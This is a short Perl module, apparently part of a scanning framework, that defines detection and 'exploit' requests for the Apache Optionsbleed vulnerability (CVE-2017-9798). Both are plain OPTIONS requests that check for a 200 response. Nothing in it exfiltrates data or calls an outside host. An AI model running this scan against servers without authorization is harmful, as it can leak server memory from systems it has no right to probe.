package APACHE::MSF::ApacheOptionsbleed;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ApacheOptionsbleed";

   my $DETECTION = {
  METHOD => 'OPTIONS',
  PATH => '/',
  PAYLOAD => '',
  TEXT => 'Checking If : / Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2017-9798",
  DESCRIPTION => "

        This module scans for the Apache optionsbleed vulnerability where the Allow

        response header returned from an OPTIONS request may bleed memory if the

        server has a .htaccess file with an invalid Limit method defined.

      ",
  MSF_MODULE => "apache_optionsbleed",
  PATHS => [""],
  REFERENCES => [
    "https://github.com/hannob/optionsbleed",
    "https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html",
  ],
  TITLE => "Apache Optionsbleed Scanner",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI to the folder with the vulnerable .htaccess file",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'OPTIONS',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [OPTIONS] /',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
